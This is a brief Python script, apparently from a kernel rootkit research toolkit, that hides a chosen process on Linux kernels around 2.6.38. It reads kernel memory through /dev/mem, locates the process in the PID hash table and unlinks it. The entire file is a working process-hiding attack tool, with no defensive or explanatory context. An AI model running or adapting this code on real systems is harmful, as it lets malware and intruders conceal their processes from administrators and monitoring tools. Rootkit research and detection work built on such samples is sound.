#!/usr/bin/python

"""
Remove an item from the PidHash table.
This hides a process on recent kernels,
such as 2.6.38

Ryan Riley
rriley.cs@gmail.com
"""

import os, sys
from ctypes import *

import version
exec("from dorf."+version.my_version+".kstructs import *")
exec("from dorf."+version.my_version+".memreader import *")
exec("from dorf."+version.my_version+".symbolfinder import *")

from dorf.hashtable.pidhash import *


if len(sys.argv) != 2:
	print "Usage: ",
	print sys.argv[0],
	print " <pid to remove>"
	sys.exit(-1)

the_pid = int(sys.argv[1])

sf = SymbolFinder()
dm = DevMemReader(sf)


ph = PidHash(sf,dm)
t = ph.find(the_pid)
if t != None:
	print "Found " + str(t.nr)
	t.pid_chain.remove(dm)
